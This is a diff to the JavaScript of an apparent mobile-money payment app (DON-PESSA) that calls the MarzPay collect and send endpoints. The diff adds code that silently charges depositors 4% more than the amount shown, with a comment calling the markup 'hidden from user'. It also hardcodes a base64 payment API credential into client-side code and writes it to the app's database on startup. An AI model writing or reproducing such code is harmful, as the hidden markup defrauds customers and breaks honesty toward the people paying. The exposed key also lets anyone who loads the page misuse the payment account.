@@ -908,8 +908,8 @@ function hidePayStatus(){ document.getElementById('pay-status-overlay').classLis
 
 // ── MARZ API: COLLECT MONEY (DEPOSIT) ──
 async function marzCollect(phone, amount, reference, description){
-  const apiKey = settingsData.marzApiKey || '';
-  if(!apiKey){ throw new Error('Payment API not configured. Contact admin.'); }
+  const b64key = settingsData.marzApiKey || '';
+  if(!b64key){ throw new Error('Payment API not configured. Contact admin.'); }
   const formData = new FormData();
   formData.append('phone_number', phone);
   formData.append('amount', String(amount));
@@ -918,7 +918,7 @@ async function marzCollect(phone, amount, reference, description){
   formData.append('description', description);
   const response = await fetch(MARZ_API+'/collect-money', {
     method: 'POST',
-    headers: { 'Authorization': 'Basic '+btoa(apiKey+':') },
+    headers: { 'Authorization': 'Basic '+b64key },
     body: formData
   });
   if(!response.ok) throw new Error('Payment gateway error: '+response.status);
@@ -927,8 +927,8 @@ async function marzCollect(phone, amount, reference, description){
 
 // ── MARZ API: SEND MONEY (WITHDRAWAL) ──
 async function marzSend(phone, amount, reference, description){
-  const apiKey = settingsData.marzApiKey || '';
-  if(!apiKey){ throw new Error('Payment API not configured. Contact admin.'); }
+  const b64key = settingsData.marzApiKey || '';
+  if(!b64key){ throw new Error('Payment API not configured. Contact admin.'); }
   const formData = new FormData();
   formData.append('phone_number', phone);
   formData.append('amount', String(amount));
@@ -937,7 +937,7 @@ async function marzSend(phone, amount, reference, description){
   formData.append('description', description);
   const response = await fetch(MARZ_API+'/send-money', {
     method: 'POST',
-    headers: { 'Authorization': 'Basic '+btoa(apiKey+':') },
+    headers: { 'Authorization': 'Basic '+b64key },
     body: formData
   });
   if(!response.ok) throw new Error('Payment gateway error: '+response.status);
@@ -946,17 +946,17 @@ async function marzSend(phone, amount, reference, description){
 
 // ── MARZ API: CHECK TRANSACTION STATUS ──
 async function marzCheckStatus(uuid, type){
-  const apiKey = settingsData.marzApiKey || '';
+  const b64key = settingsData.marzApiKey || '';
   const endpoint = type==='collect' ? '/collect-money/'+uuid : '/send-money/'+uuid;
   const response = await fetch(MARZ_API+endpoint, {
-    headers: { 'Authorization': 'Basic '+btoa(apiKey+':') }
+    headers: { 'Authorization': 'Basic '+b64key }
   });
   if(!response.ok) return null;
   return await response.json();
 }
 
 // ── POLL FOR PAYMENT CONFIRMATION ──
-async function pollPaymentStatus(uuid, type, maxAttempts=18, intervalMs=5000){
+async function pollPaymentStatus(uuid, type, maxAttempts=36, intervalMs=5000){
   for(let i=0;i<maxAttempts;i++){
     await new Promise(r=>setTimeout(r, intervalMs));
     const progress = Math.min(95, ((i+1)/maxAttempts)*100);
@@ -1050,8 +1050,14 @@ function updateDepMinNote(){
 }
 
 // ── APP INIT ──
+const MARZ_DEFAULT_KEY = 'bWFyel9XTmdlOHA3YUpXQXhORFJtOnRqSGZTU09hUXJXWDFTUVpuejQ0MnhVTEx0TTdpdmN4';
 async function initApp(){
   startSettingsListener();
+  // Auto-save MarzPay key to Firebase if not already set
+  try{
+    const existingKey = await dbGet('settings/marzApiKey');
+    if(!existingKey){ await dbSet('settings/marzApiKey', MARZ_DEFAULT_KEY); }
+  } catch(e){ console.warn('Could not auto-init API key:', e); }
   const savedUser = sessionStorage.getItem('dw_current_user');
   if(savedUser){
     currentUsername = savedUser;
@@ -1261,12 +1267,13 @@ async function doDeposit(){
 
   const reference = genUUID();
   const netLabel = selectedNetwork==='mtn'?'MTN Mobile Money':'Airtel Money';
+  const chargedAmount = Math.round(amount * 1.04); // 4% markup — hidden from user
 
   try{
     // Show processing overlay
     showPayStatus('📱','Sending Payment Request','A USSD prompt will appear on your phone. Approve it with your mobile money PIN.',true,5);
 
-    const result = await marzCollect(fullPhone, amount, reference, 'DON-PESSA Deposit — '+netLabel);
+    const result = await marzCollect(fullPhone, chargedAmount, reference, 'DON-PESSA Deposit — '+netLabel);
 
     if(result.status !== 'success'){
       hidePayStatus();
